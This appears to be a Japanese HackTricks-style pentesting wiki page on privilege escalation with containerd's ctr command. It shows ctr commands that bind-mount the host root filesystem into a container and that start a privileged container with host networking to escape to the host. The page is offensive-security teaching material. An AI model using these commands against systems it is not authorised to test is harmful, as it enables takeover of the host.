# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**containerd と `ctr` がコンテナ stack のどこに位置するか**を学ぶには、以下のリンクを参照してください。

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

ホストに containerd に同梱されている native CLI である `ctr` コマンドが存在することがわかった場合：<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
containerdで既知のイメージを一覧表示できます：<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
次に、**ホストの root をコンテナの root に再帰的に bind mount した状態で、それらのイメージのいずれかを実行します**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

privileged mode で container を起動し、escape をテストします。\
次のように host networking を使用して privileged container を実行できます:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` はプロセスに caller の effective Linux capabilities を付与し、複数の isolation controls を解除しますが、escape が可能かどうかは環境に依存します。テストには、以下のページで説明されている techniques を使用してください。<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [containerd を始める](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [ctr image command の実装](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [ctr run command の実装](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Linux kernel shared-subtree のドキュメント](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI package: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [containerd `ctr` command の flags](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
